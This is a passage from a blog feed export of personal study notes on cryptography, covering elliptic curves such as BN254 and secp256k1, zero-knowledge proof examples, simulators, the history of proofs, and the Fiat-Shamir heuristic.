Returns a root of unity of order &quot;order&quot;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    assert (MODULUS - 1) % order == 0</span><br><span class="line">    return pow(PRIMITIVE_ROOT, (MODULUS - 1) // order, MODULUS)</span><br></pre></td></tr></table></figure><p>注意: order 选择 2 幂次 ref: <ahref="https://sharmaeklavya2.github.io/theoremdep/nodes/abstract-algebra/groups/cyclic-groups/order-of-elements-in-cyclic-group.html#:~:text=In%20a%20cyclic%20group%20of,%E2%88%88%20Z%20n%20d%20%E2%88%97%20%7D%20.">Orderof elements in cyclic group - TheoremDep</a></p><p>Ethereum EIP-4844 引入 KZG commitment 对分片交易进行压缩证明: <ahref="https://eips.ethereum.org/EIPS/eip-4844">EIP-4844: Shard BlobTransactions</a></p><p><a href="https://hackmd.io/@benjaminion/bls12-381">BLS12-381 For TheRest Of Us - HackMD</a> <a href="http://aandds.com/blog/bls.html">BLSCurves (BLS12-381) and BLS Signatures</a></p><h2 id="alt_bn128">alt_bn128</h2><p>ALT_BN128 (2015),Also known as BN254, 254-bit curve (used in Ethereumzkp). Developed by SCIPR-lab.</p><p>pairing friendly</p><p>order of bn128:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hex(21888242871839275222246405745257275088548364400416034343698204186575808495617)</span><br><span class="line">0x30644e72e131a029b85045b68181585d2833e84879b9709143e1f593f0000001</span><br></pre></td></tr></table></figure><p>Generator 5.</p><h2 id="the-secp256k1-curve">the secp256k1 curve</h2><p>Secp256k1 is the name of the elliptic curve used by Bitcoin toimplement its public key cryptography, ECDSA algorithm. All points onthis curve are valid Bitcoin public keys.</p><p>Formula:</p><p>For secp256k1, a=0 and b=7, yields the equation <spanclass="math inline">\(y^2 = x^3 + 7\)</span></p><h2 id="jacobi-curve">Jacobi curve</h2><blockquote><p>In mathematics, the Jacobi curve is a representation of an ellipticcurve different from the usual one defined by the Weierstrass equation.Sometimes it is used in cryptography instead of the Weierstrass formbecause it can provide a defence against simple and differential poweranalysis style (SPA) attacks;</p></blockquote><p><a href="https://en.wikipedia.org/wiki/Jacobian_curve">Jacobian curve- Wikipedia</a></p><p><strong>Jacobian Coordinates</strong> are used to represent ellipticcurve points on prime curves. They give a speed benefit over<strong>Affine Coordinates</strong> when the cost for field inversionsis significantly higher than field multiplications.</p><p>note: 相同的点可能 Jacobian point 的坐标不一样, 用 <code>==</code>判断即可。</p><h2 id="references">References</h2><ul class="task-list"><li><label><input type="checkbox" />TODO complete reading</label></li></ul><ol type="1"><li><a href="https://hackmd.io/@benjaminion/bls12-381">BLS12-381 For TheRest Of Us - HackMD</a></li><li><ahref="https://github.com/zcash/librustzcash/blob/6e0364cd42a2b3d2b958a54771ef51a8db79dd29/pairing/src/bls12_381/README.md#generators">librustzcash/pairing/src/bls12_381/README.mdat 6e0364cd42a2b3d2b958a54771ef51a8db79dd29 ·zcash/librustzcash</a></li><li><ahref="https://members.loria.fr/AGuillevic/pairing-friendly-curves/">Pairing-friendlycurves – Aurore GUILLEVIC</a></li><li><a href="https://xn--2-umb.com/22/pairings/">Math &amp;Engineering</a></li><li><a href="https://hackmd.io/@vivi432/bn128-in-c">BN128 curve — Cimplementation - HackMD</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Three ZK Examples</title>
      <link href="/blog/2023/03/24/crypto/zk/5.three_problem/"/>
      <url>/blog/2023/03/24/crypto/zk/5.three_problem/</url>
      
        <content type="html"><![CDATA[<h1 id="three-zk-examples">Three ZK Examples</h1><h2 id="graph-3-colouring">Graph 3-colouring</h2><p>Details can be seen in the following two great lecture notes, which Ihave attached here. <ahref="./media/cornell_lecture18_easy_understand.pdf">cornell_lecture18more easier to understand</a> <ahref="./media/cmu_lecture23_more_formal.pdf">cmu_lecture23 moreformal</a> There is a visual demonstration for Graph 3-coloring fromMIT, <ahref="http://web.mit.edu/~ezyang/Public/graph/svg.html">Interactive zeroknowledge 3-colorability demonstration</a>.</p><p>The concept of simulator can be seen in note [4.simulator.md]</p><p>Some points should be highlight to understand the above materialsbetter and deeper.</p><ol type="1"><li><p>There are some common knowledge for the prover and verifers about3-colorable graphs. The graph, three colors used, and the principles ofthe ZK-Graph 3-coloring protocol is known for both prover and theverifers. Therefore, the brute force from malicious verifier about thegraph is nearly impossible. The reason is that the prover randomlypermutes the colors in each round, and the color of a particular edgemay be different in different rounds. The randomness make the bruteforce nearly impossible.</p></li><li><p>The verifier can only tell that the prover has at least one truewitness, not whether it has a different true witness than ituses.</p></li><li><p>The answer of the two exercises from the visual demonstration ofMIT.</p><blockquote><p>Exercise 1: Currently, you can only select adjacent pairs of nodes tocheck. Would the proof still be zero knowledge if you could pickarbitrary pairs of nodes to check?</p></blockquote><p>No. Why is this a zero-knowledge proof currently? the reason is thatthe verifier already knows the property that no two vertices of the samecolor are connected by an edge. If the verifier wants, it could alsogenerate the same graph with the specific edge it just verified usingtwo vertices of different colors. So in some sense, the information theprover give the verifier doesn't tell the verifier anything that itdidn't already know.</p><p>The idea/intuition definition of zero-knowledge (Just three differentways of expressing the same thing)</p><ol type="1"><li>A proof system is zero knowledge if the verifier did not learnanything after the interaction that he could not have learned on hisown.</li><li>the proof should reveal nothing to the verifier beyond what theverifier already knows.</li><li>Proof pi reveals nothing about the secret witness, other than itsexistence.</li></ol><p>When you can only select adjacent pairs of nodes to check, you justget information about the (specific) adjacent pairs of nodes that arecolored differently. This kind of information is what the verifieralready knows, making it not knowledge for the verifier, because it canhelp nothing about the prover solving the 3-coloring problem. However,when the verifier can choose any pair of nodes to check, the verifiercan gain some additional knowledge because it starts to know which twoare the same color and which two are different colors. As the number ofverifications increases, the accumulated knowledge may lead to theleakage of secrets.</p><blockquote><p>Exercise 2: The equation currently being used for confidence is1-(1/E)^n, where E is the number of edges in the graph, and n is thenumber of trials run. Is this the correct equation? Why is there noprior?</p></blockquote><p>No, For n-iteration, the confidence metric should be <spanclass="math inline">\(1-(1-1/|E|)^n\)</span>. The colored graphcommitted by a cheating prover has at least 1 edge whose two endpointsare colored with the same color. The verifier can catch him wheneverhappens to request the colors for this edge with probability 1/|E|. Byperforming n sequential repetitions of the protocol, we can get thesoundness error down to <spanclass="math inline">\((1-1/|E|)^n\)</span>, which is negligible. Hencethe confidence metric should be <spanclass="math inline">\(1-(1-1/|E|)^n\)</span></p><p>Why is there no prior?</p><p>The prover can randomly permutate the secret coloring in each round,which makes each trial or verification independent of theother.</p></li></ol><h2 id="hamilton-cycles-of-graph">Hamilton Cycles of Graph</h2><p>Hamilton cycle: a cycle going through every vertex of the graphexactly once and return to the start.</p><p>Hamilton Cycles is a NP problem. If you know a zero-knowledgeprotocol for Hamilton Cycles, you can reduce all NP problem to use thisprotocol, which means you know a zero-knowledge protocol for all NPproblem.</p><p>Graph Hamiltonicity is also covered in <ahref="./media/cornell_lecture18_easy_understand.pdf">cornell_lecture18more easier to understand</a>.</p><p>P: know a hamilton cycle C on graph G. Each round:</p><ol type="1"><li>P: random permutation <span class="math inline">\(\phi\)</span> overG</li><li>P: commit two commitment: the permutation <spanclass="math inline">\(\phi\)</span> and edges in <spanclass="math inline">\(\phi(G)\)</span></li><li>V: The verifier flip coin to get a challenge bit b ∈ {0, 1}.</li><li>if b=0, for permutated graph, P reveal the permutation <spanclass="math inline">\(\phi\)</span> and <spanclass="math inline">\(C_{i,j}\)</span> edges in <spanclass="math inline">\(\phi\)</span> to V for isomorphic verification,checking whether the graph is isomorphic to the public graph G</li><li>if b=1, for hamilton cycle, P translate the Hamiltonian cycle <spanclass="math inline">\(C_H\)</span> onto <spanclass="math inline">\(\phi(G)\)</span>, and reveal the translatedcorresponding edges of hamiltonian cycle in <spanclass="math inline">\(\phi(G)\)</span> to verifier. The verifier unveilthe received edges and check if they are a Hamiltonian cycle on thepermuted graph <span class="math inline">\(\phi(G)\)</span>.</li></ol><p>Note: verifier can simulate a permutated graph or a hamilton cycle,but not both at the same time.</p><p><ahref="https://people.eecs.berkeley.edu/~sanjamg/classes/cs294-spring16/scribes/7.pdf">HamiltonianCycles Lecture 7: Zero Knowledge II</a></p><p>Q: Why verifier need to flip a coin? A: If the challenge preferenceis known by proof, which might be malicious, the prover can forge themust-chosen one arbitrarily without caring about the other one, whichmake the proof invalid.</p><p>Q: One issuse is this protocol requires interaction. The interactiveproof is non-practical for real-world application,such as blockchain,How about non-interactive proof? A: Fiat-Shamir heuristic: a way to turninterative proo to non-interactive proof and still maintain goodproperties.</p><p>The prover try to simulate the verifier by help the verifier pick therandomness. The prover is protentially malicious, and if it know inadvance what coins the verifier will flip, it can do bad things. To makenon-interactive proof, you need to make sure the prover cannot simulatethe coin to its advantage.</p><p>Fiat-Shamir heuristic: The prover can simulate the verifier byrunning a cryptographic hash function on the transcript to generate therandomness, so P cannot cheating by adversarily choosing favorableso-call random but random challenge. You force it to flip a coins byapplying a cryptographic hash function to everything that has happenedin this interaction.</p><p>Q: Another issuse is the proof is so big. How to make it succinct?A:</p><h2 id="todo--">TODO - [ ]</h2><h2 id="references">References</h2><ol type="1"><li><ahref="https://www.cs.cmu.edu/~goyal/s18/15503/scribe_notes/lecture23.pdf">cmuscribe notes lecture23</a></li><li><ahref="http://www.cs.cornell.edu/courses/cs6830/2011fa/scribes/lecture18.pdf">cornellscribes notes lecture18</a></li></ol><ul><li>[] <a href="https://intensecrypto.org/public/">An intensiveintroduction to cryptography-Chapter 13-BOAZ BARAK</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>The concept of simulator for Zero Knowledge property</title>
      <link href="/blog/2023/03/23/crypto/zk/4.simulator/"/>
      <url>/blog/2023/03/23/crypto/zk/4.simulator/</url>
      
        <content type="html"><![CDATA[<h1 id="the-concept-of-simulator-for-zero-knowledge-property">Theconcept of simulator for Zero Knowledge property</h1><h2 id="computational-indistinguishability">Computationalindistinguishability</h2><p>TODO - [] todo</p><h2 id="knowledge-vs-information">Knowledge vs information</h2><p>Refererce: Foundations of Cryptography - Basic Tools 4.1.2. GainingKnowledge, p211</p><h2 id="zero-knowledge-property">zero knowledge property</h2><p>For zero knowledge property, simulator is commonly used to prove theproperty of zero knowledge.</p><p>In cryptographic protocols, the simulator always has more power thanthe real prover. Sometimes the simulator can generate the parts of thetranscript in a different order. Sometimes the simulator can "rewindtime" -- so the verifier asks a question, and then we rewind time andstart the transcript over, knowing what the verifier is going to ask.Sometimes the simulator literally has more computational power than thereal prover. Sometimes the simulator has some extra information that thereal prover doesn't have (like a trapdoor to some common referenceinformation used in the proof).</p><p>Simulator is a rigorous way of formalizing the following idea: theverifier didn't learn anything because "they could have generated thetranscript themselves.". In other word, the intuition of the simulatoris, from the point of view of the verifier, a statistically negligibleequal distribution output compared to a real prover in terms ofprobability difference, but without having access to the prover.Expected running time of simulator must be polynomial in problemsize.</p><p>The simulator is an efficient machine that has oracle access to theverifier and given the statement as input, it, in place of prover,simulates the view of the (adversarial) verifier. Since the simulationis possible using only the statement, it can be <strong>argued that theverifier learns nothing more (about the witness).</strong></p><p>The extractor concerns zero-knowledge proofs of knowledge which arezero-knowledge proofs which additionally <strong>guarantee that theprover indeed holds the witness.</strong> In particular, the extractorgiven access to the prover (which it can potentially rewind) can extractthis witness for example by rewinding it.</p><p>A key role in proving that an interactive system has the property ofzero knowledge is played by the Simulator (S), which simulates P butdoes not have access to the witness. His contribution is as follows: Vinteracts with S. At some point V will put S in the 'difficult position'of not being able to answer a question, as he does not have access tothe witness. In this case we return the V movie to a state before theunpleasant question (rewind) and run the protocol from that pointonwards. If V (with continuous rewinds) finally accepts S's proof, theprotocol has the status of zero knowledge, as V can not distinguishbetween a P who knows the witness and an S who pretends. That is, V doesnot export any additional information from the protocol (since in thesecond case there is no information to export).</p><p>Simulation of proof in place of P interacts with V. We can notdistinguish the interactions ⟨S, V⟩ and ⟨P, V⟩. We also allow rewinds:If at some point V 'asks' something he can not answer, S then stop -rewind Zero knowledge if V at some point accepts (even withrewinds).</p><p>Why: Cannot distinguish P (having witness) from S (not available). Aslong as S remains PPT Specifically: A V that extracts information from Pwill extract the same information from S (where there is nothing toexport)</p><h2 id="formal-definition-of-zero-knowledge-with-turing-machine">Formaldefinition of zero-knowledge with Turing machine</h2><p>A formal definition of zero-knowledge has to use some computationalmodel, the most common one being that of a Turing machine.</p><h2 id="simulator-and-knowledge-extractor">Simulator and Knowledgeextractor</h2><ul><li>simulator: If the simulator have the ability of cheating withoutsuperpower, the protocol can be proved to be unsound</li><li>extractor: If the extractor can extract the knowledge of Aliceentirely by leveraging time rewind in the ideal world, the goal that aAlice without knowledge cannot be knowledge extracted is guaranteed, andthe soundness can be proved.</li></ul><p>Better look at <ahref="https://github.com/sec-bit/learning-zkp/blob/master/zkp-intro/2/zkp-simu.md">learning-zkp/zkp-simu.mdat master · sec-bit/learning-zkp · GitHub</a></p><h2 id="references">References</h2><ol type="1"><li><ahref="https://crypto.stackexchange.com/questions/96587/simulator-vs-prover-zero-knowledge-property">Simulatorvs Prover -- Zero Knowledge Property - Cryptography StackExchange</a></li><li><ahref="https://crypto.stackexchange.com/questions/67610/what-is-purpose-of-a-simulator-and-extractor-in-zero-knowledge-proof-protocols">provablesecurity - What is purpose of a simulator and extractor in zeroknowledge proof protocols? - Cryptography Stack Exchange</a></li><li><ahref="https://en.wikipedia.org/wiki/Zero-knowledge_proof">Zero-knowledgeproof - Wikipedia</a></li></ol><ul class="task-list"><li><label><input type="checkbox" /><ahref="https://blog.cryptographyengineering.com/2014/11/27/zero-knowledge-proofs-illustrated-primer/">ZeroKnowledge Proofs: An illustrated primer – A Few Thoughts onCryptographic Engineering</a></label></li><li><label><input type="checkbox" /><ahref="https://blog.cryptographyengineering.com/2017/01/21/zero-knowledge-proofs-an-illustrated-primer-part-2/">ZeroKnowledge Proofs: An illustrated primer, Part 2 – A Few Thoughts onCryptographic Engineering</a></label></li><li><label><input type="checkbox" /><ahref="https://medium.com/magicofc/interactive-proofs-and-zero-knowledge-b32f6c8d66c3">OnInteractive Proofs and Zero-Knowledge: A Primer | by Yannik Goldgräbe |C³AI | Medium</a></label></li></ul>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Evolution of Poof</title>
      <link href="/blog/2023/03/22/crypto/zk/3.proof_evolving/"/>
      <url>/blog/2023/03/22/crypto/zk/3.proof_evolving/</url>
      
        <content type="html"><![CDATA[<h1 id="explain-the-evolution-of-poof">Explain the Evolution ofPoof</h1><p>To explain the term "zero knowledge proof", we first need to define"proof", "knowledge", and then we can proceed to explain what "zeroknowledge" means.</p><p>To know the popular ZK-SNARK (Zero-Knowledge Succinct Non-interactiveARguments of Knowledge), the distinction between "arguments" and "proof"is also need to be elaborated.</p><h2 id="proof-system">proof system</h2><blockquote><p>if the part of history is too long to read, you can directly read thesubtitles</p></blockquote><p>The 'subtitles' are listed as follows:</p><ul class="task-list"><li><label><input type="checkbox" />TODO: read and digest <ahref="https://nibnalin.me/assets/zk.pdf">A Succinct Story of ZeroKnowledge</a></label></li></ul><ol type="1"><li><p>Ancient Greece: Proof == insight Mathematical proof is originatefrom ancient Greece, where the axiom and logic is found，for example,Goldbach conjecture</p><p>Ever since Leibniz in the 17th century, people have dreamed of<strong>a mechanical way to do this automatically</strong>, rather thanrelying on a stroke of genius</p></li><li><p>Early twentieth century: Proof == symbolic reasoning</p><p>A symbolic system for formalizing logic is defined. The proof is thereasoning process written in the symbolic language of formal logic</p><p>Unfortunately, Godel's proof of Godel's incompleteness theorem in1931 and Turing's proof of the undecidability of Turing's machinestopping problem in 1936 put to rest once and for all the centuries-oldillusion that no axiomatic system, however elaborate, could capture allthe truth.</p></li><li><p>60s: Proof == program It is true that the use of computers caneffectively help the mathematician's mind to reach more unknown spaces,but finding proof is still the most challenging work and verifying proofhas to be a simple mechanical and limited work, because of the naturalasymmetry.</p></li><li><p>80s: Proof == interaction Goldwasser, Micali and Rackoff [GMR85]proposed "The knowledge complexity of interactive proof systems."(交互式证明系统中的知识复杂性). GMR85 introduced the notion ofinteractive proofs, where the verifier verifies the correctness of astatement, by interacting with the prover and by using randomness. Aswas shown later by Lund, Fortnow, Karloff, Nisan, and Shamir [LFKN90,S90], interactive proofs seem to be much more powerful than standardproofs, as <strong>every language in PSPACE can be verified efficientlyvia an interactive proof, whereas only languages in NP can be verifiedefficiently via a standard proof</strong>. More specifically, [LFKN90,S90] showed that any language that can be computed in space s has aninteractive proof where the verifier runs in time poly(s,n), where n isthe instance size. Unfortunately, the running time of the prover in suchproofs is exponential in s. (In these original works the running timewas 2<sup>{O(s</sup>2)}, and this was later improved to be 2^{O(s)} by[GKR08]).</p><p>A few years after interactive proofs were introduced, Ben-Or,Goldwasser, Kilian, and Wigderson [BGKW88] introduced the notion of<strong>multi-prover interactive proofs (MIPs)</strong>. In this model,there are several provers that are proving a statement to a singlepolynomial time verifier, and the assumption is that these provers donot communicate with each other during the proof. [BGKW88] showed thatwhatever can be proved with k provers can also be proved with only twoprovers. Soon after the model of MIP was introduced, Fortnow, Rompel andSipser [FRS94] noticed that MIPs can be converted into<strong>probabilistically checkable proofs (PCPs)</strong>. (We notethat the work of [FRS94] was done before the notion of PCPs was formallydefined. However, they notice that the <strong>verifers can be replacedwith an oracle</strong>, and that given this oracle, a probabilisticverifier can efficiently decide the language.)</p><p>PCPs are proofs which can be verified by a probabilistic verifier byreading only a few bits of the proof.</p><p>Two element have been added to the notion of proof:<strong>probabilistic and interactive</strong>. You are willing toaccept that small statement with the small probability of error and thenotion of interaction. So here we have interactive proof, PCPs,MIPs（can only need two provers）. However, there three approach are notpractical (for cloud computation delegation). Interactive proofs canonly be applied to LOG SPACE languages. In addition, the resulting proofhas many rounds of interaction. PCPs requires the verifier to store theentire PCP, and in many settings the verifier is space bounded andcannot store such a long string. Using MIPs requires the existence oftwo clouds that do not interact with each other, and we prefer not tomake such an assumption, since our starting point is that we do nottrust the cloud, and hence do not trust that the clouds will notinteract.</p><p>Cryptographic assumptions empowers ZK. However, the resultingprotocols are <strong>not (interactive) proofs</strong>, as they do notsatisfy the usual soundness condition, but rather satisfy a weakenedversion: The requirement is that only computationally bounded cheatingprovers cannot convince the verifier of the validity of incorrectstatements (whereas an all powerful adversary may be able to cheat). Aprotocol that satisfies such a computational soundness condition iscalled an <strong>interactive argument</strong>(as opposed to aninteractive proof), a notion that was introduced by Brassard, Chaum andCrepeau [BCC88]. The motivation behind such a definition is the beliefthat in real life adversaries are not all powerful.</p></li></ol><h2 id="arguments-and-proofs-of-knowledge">arguments and proofs ofknowledge</h2><p>From the discrete math, it can be known that an argument is a list ofstatements called premises followed by a statement called theconclusion. (We allow the list of premises to be empty). We say that anargument is valid if the conjunction of its premises implies itsconclusion. In other words, validity means that if all the premises aretrue, then so is the conclusion. Validity of an argument does notguarantee the truth of its premises, so does not guarantee the truth ofits conclusion. <strong>The validity of an argument only guarantees thatthe conclusion will be true if the premises are.</strong></p><p>Due to the following three reasons, <strong>an alternative way ofshowing that an argument is valid, called a proof</strong>, isproposed</p><p>First, the truth table can get quite large. Second, checking thevalidity of an argument mechanically by constructing a truth table isalmost completely unenlightening Lastly, while truth tables suffice tocheck the validity of statements in the propositional calculus, they donot work for the predicate calculus</p><p>A proof is an argument that applies one or more: sound reasoningmethods.</p><p><strong>Proofs</strong>: A proof of an argument is a list ofstatements, each of which is obtained from the preceding statementsusing one of the rules of inference T1, T2, S, C, or P. The laststatement in the proof must be the conclusion of the argument.</p><p>Q: What does a proof actually have to do with the validity of anargument? A: On the one hand, a proof establishes the validity of anargument. A proof does show that an argument is valid. Every validargument in propositional calculus has a proof. In other words, anargument is valid if and only if there is a proof of it.</p><h3 id="zk-proof-vs-zk-argument">zk proof vs zk argument</h3><p>Zero-knowledge protocols come in several flavors, depending on howone formulates the two security conditions:</p><ol type="1"><li><p>the zero-knowledge condition, which says that the verifier“learns nothing” other than the fact the assertion being proven istrue,</p><p>In statistical zero knowledge, the zero-knowledge condition holdsregardless of the computational resources the verifier invests intotrying to learn something from the inter-action. In computational zeroknowledge, we only require that a probabilistic polynomial-time verifierlearn nothing from the interaction.</p></li><li><p>the soundness conditions, which says that the prover cannotconvince the verifier of a false assertion.</p><p>Similarly, for soundness, we have statistical soundness, a.k.a. proofsystems, where even a computationally unbounded prover cannot convincethe verifier of a false statement (except with negligible probability),and computational soundness, a.k.a. argument systems [BCC88], where weonly require that a polynomial-time prover cannot convince the verifierof a false statement.</p></li></ol><p>It is useful to distinguish between zero-knowledge proofs, withstatistical soundness, and zero-knowledge arguments with computationalsoundness. In general, proofs can only have computationalzero-knowledge, while arguments may have perfect zero-knowledge.</p><p>In a proof, the soundness holds against a computationally unboundedprover and in an argument, the soundness only holds against apolynomially bounded prover. Arguments are thus often called"computationally sound proofs". A zero knowledge argument is just a zeroknowledge proof that has computational soundness rather than statisticalsoundness.</p><p>It's worth noting that the terms are often used interchangeably inrecent literature. Papers may still uses "proof" to mean "argument"</p><h2 id="references">References</h2><ol type="1"><li><ahref="https://github.com/sec-bit/learning-zkp/blob/master/zkp-intro/1/zkp-back.md">初识「零知识」与「证明」</a></li><li><ahref="https://windowsontheory.org/2012/09/18/the-evolution-of-proofs/">TheEvolution of Proofs – Windows On Theory</a></li><li><ahref="https://crypto.stackexchange.com/questions/34757/what-is-the-difference-between-proofs-and-arguments-of-knowledge">soundness- what is the difference between proofs and arguments of knowledge? -Cryptography Stack Exchange</a></li><li><ahref="https://www.zweigmedia.com/RealWorld/logic/logic6.html#:~:text=On%20the%20one%20hand%2C%20a,that%20an%20argument%20is%20valid.">6.Arguments and Proofs</a></li><li>《逻辑的引擎》</li><li><ahref="http://people.seas.harvard.edu/~salil/research/SZKargs-focs.pdf">SZKargs-focs.pdf</a></li><li>[BCC88] Gilles Brassard, David Chaum, Claude Crépeau: MinimumDisclosure Proofs of Knowledge. J. Comput. Syst. Sci. 37(2): 156-189(1988).</li><li><ahref="https://www.youtube.com/watch?v=6uGimDYZPMw&amp;list=PL8Vt-7cSFnw29cLUVqAIuMlg1QJ-szV0K&amp;index=3">Introductionto Zero Knowledge - Alon Rosen - YouTube</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fiat-Shamir heuristic and Non-interactive Proof</title>
      <link href="/blog/2023/03/20/crypto/zk/2.fiatshamir_nizk/"/>
      <url>/blog/2023/03/20/crypto/zk/2.fiatshamir_nizk/</url>
      
        <content type="html"><![CDATA[<h1 id="fiat-shamir-heuristic-and-non-interactive-proof">Fiat-Shamirheuristic and Non-interactive Proof</h1><h2 id="what-is-heuristic">what is heuristic</h2><p>heuristic (from Greek εὑρίσκω "I find, discover"): The use ofexperience and practical efforts to find answers to questions or toimprove performance -- Longman dictionary about "heuristic"</p><blockquote><p>In mathematical optimization and computer science, heuristic (fromGreek εὑρίσκω "I find, discover") is a technique designed for solving aproblem more quickly when classic methods are too slow for finding anapproximate solution, or when classic methods fail to find any exactsolution. This is achieved by trading optimality, completeness,accuracy, or precision for speed. In a way, it can be considered ashortcut. Nevertheless, heuristics is a widely used technique for avariety of reasons:</p><ol type="1"><li>Problems that do not have an exact solution or for which theformulation is unknown</li><li>The computation of a problem is computationally intensive</li><li>Calculation of bounds on the optimal solution in branch and boundsolution processes</li></ol></blockquote><p>Examples that employ heuristics include using trial and error, a ruleof thumb or an educated guess.</p><p>Heuristics are the strategies derived from previous experiences withsimilar problems. These strategies depend on using readily accessible,though loosely applicable, information to control problem solving inhuman beings, machines and abstract issues. When an individual applies aheuristic in practice, it generally performs as expected. However it canalternatively create systematic errors.</p><p>人在解决问题时所采取的一种根据经验规则进行发现的方法。其特点是在解决问题时,利用过去的经验,选择已经行之有效的方法，而不是系统地、以确定的步骤去寻求答案。启发式解决问题的方法是与算法相对立的。算法是把各种可能性都一一进行尝试，最终能找到问题的答案，但它是在很大的问题空间内，花费大量的时间和精力才能求得答案。启发式方法则是在有限的搜索空间内,可接受的计算成本内，大大减少尝试的数量，能迅速地达到问题的解决。但由于这种方法具有尝试错误的特点，所以不一定能保证所得的可行解和最优解,也就是说有失败的可能性,甚至在多数情况下，无法阐述所得解同最优解的近似程度。因为启发式算法现在还没有完备的理论体系，只能视作一种技术。科学家的许多重大发现，常常是利用极为简单的启发式规则。</p><p>利用启发式算法进行目标优化的一些优缺点如下：</p><table><colgroup><col style="width: 49%" /><col style="width: 50%" /></colgroup><thead><tr class="header"><th>优点</th><th>缺点</th></tr></thead><tbody><tr class="odd"><td>1. 算法简单直观，易于修改 <br> 2.算法能够在可接受的时间内给出一个较优解</td><td>1. 不能保证为全局最优解 <br>2.算法不稳定，性能取决于具体问题和设计者经验</td></tr></tbody></table><h2 id="fiat-shamir-heuristic">Fiat-Shamir heuristic</h2><p>The initial idea of Fiat and Shamir was to eliminate the interactionin public coin protocols (note that public coin means that the randomchoices of the verifier are made public) and was used to convert threesteps public coin identification scheme into conceptually simplesignature schemes (it has later been proven by Pointcheval and Sternthat under the random oracle model such signature schemes provideexistential unforgeability under chosen message attacks).</p><p>If you apply the Fiat-Shamir heuristic to interactive zero-knowledgeproofs you</p><ol type="1"><li><p>firstly collapse the protocol rounds which all the smallchallenge space of <span class="math inline">\(\{0,1\}\)</span> into oneround using a larger challenge space (e.g., <spanclass="math inline">\(ℤ𝕡\)</span>, where the size of the message spacecontrols the soundness error) at the cost of only being honest-verifierzero-knowledge, and</p></li><li><p>secondly you do not longer let the verifier sample the challenge(public coins), but compute the challenge as output of a hash functionwith input the previous protocol messages. The hash function is modelledas a random oracle (outputs random strings that are not distinguishablefrom truly random strings), which models the unpredictability of theverifier.</p></li></ol><h2 id="non-interactive-proof">Non-interactive Proof</h2><p>In very simplified terms, a NI-ZK proof works in 2 stages: First, yourun the protocol with a simulator (who is just a verifier, but therandom choices are done differently), and then you can give thetranscript of the protocol to anyone and convince them that the proof isreal.</p><p>Two important ways to convert an interactive protocol to anon-interactive proof:</p><ol type="1"><li><p>In the random oracle model (assuming that you have access toideal hash functions), you can use the Fiat Shamir heuristic: Youreplace the verifier with a simulator, and whenever the verifier wouldhave to choose randomly, you use the hash function over the entireprotocol so far (most importantly, the commitments of the prover) toemulate a random unpredictable choice. Since the hash function isdeterministic, you can't change the value without changing the previousinteractions. When you're done with the protocol, you can just take thetranscript and give it to someone. However, there is a tradeoff in thesecurity level: If the prover is able to cheat with a certainprobability, then he could just try different commitments if he doesn'tlike the result of the hash function. So in order to get e.g. an errorof less than 1/280, you would need an error probability of less than1/2160 with the hash function replacing true random choices. (And thisis why it's called a heuristic, there is no proof for this)</p></li><li><p>With a common reference string you can achieve NI-ZK. The commonreference string is a random string of symbols, which is drawn from someprobability distribution. The assumption is, that these random valuesare available to all parties, but no party has any influence on theiractual choice. And if you simulate the ZK proof with the random choicesaccording to the common reference string, you should get the same resultas anyone else validating the protocol transcript. I believe you don'thave to double the security parameter in this case (like for FiatShamir), but on the other hand a common reference string is harder torealize than a hash function.</p></li></ol><h3 id="crs-model-vs-rom-model">CRS model vs ROM model</h3><p>The main difference between the ROM and CRS model is that proofs inthe ROM are heuristic, since the actual protocol instantiation uses ahash function that is blatantly NOT a random oracle. In contrast, proofsin <strong>the CRS model have a standard reduction-based proof ofsecurity</strong>, and so are not heuristic.</p><p>The main advantage of the CRS model over the random oracle model isthat security is standard, and doesn't rely on a heuristic belief systemthat the real protocol that uses a standard hash function is secure. Themain disadvantage is that you need to somehow generate this CRS, andthis isn't trivial if there's no trust. Zcash uses a CRS and ran a largeMPC protocol between many parties to generate the CRS. As long as youbelieve that not all the participants colluded, then you can trust thesystem from that point on. This is a good example of where a CRS can bedeployed in reality.</p><p>The CRS model achieves its function by incorporating hidden secrets.The reference string must have some structure based on secret randomcoins (e.g., be of the form Gs, Gs2, Gs3, . . .) and the secret(e.g.,the value s) must be discarded after generation. This makes CRSgeneration an inherently trusted process.</p><h2 id="参考">参考</h2><ol type="1"><li><ahref="https://www.ldoceonline.com/dictionary/heuristics">heuristics |meaning of heuristics in Longman Dictionary of Contemporary English |LDOCE</a></li><li><ahref="https://optimization.cbe.cornell.edu/index.php?title=Heuristic_algorithms">Heuristicalgorithms - Cornell University Computational Optimization Open Textbook- Optimization Wiki</a></li><li><ahref="https://en.wikipedia.org/wiki/Heuristic_%28computer_science%29">Heuristic(computer science) - Wikipedia</a></li><li><a href="https://en.wikipedia.org/wiki/Heuristic">Heuristic -Wikipedia</a></li><li><ahref="https://www.jianshu.com/p/0694c59aae3a">启发式算法（HeuristicAlgorithm） - 简书</a></li><li><ahref="https://leovan.me/cn/2019/04/heuristic-algorithms/#fn:1">启发式算法(Heuristic Algorithms) - 范叶亮 | Leo Van</a></li><li><ahref="https://crypto.stackexchange.com/questions/20727/explanation-of-the-fiat-shamir-heuristic">signature- Explanation of the Fiat-Shamir heuristic - Cryptography StackExchange</a></li><li><a href="https://crypto.stackexchange.com/a/14368">Answer 2 - Whatis a Non-Interactive Zero Knowledge Proof? - Cryptography StackExchange</a></li><li><ahref="https://crypto.stackexchange.com/questions/58558/what-is-the-common-reference-string-crs-model">hash- What is the Common Reference String (CRS) model - Cryptography StackExchange</a></li><li><a href="https://eprint.iacr.org/2018/280.pdf">Updatable andUniversal Common Reference Strings with Applications tozk-SNARKs</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
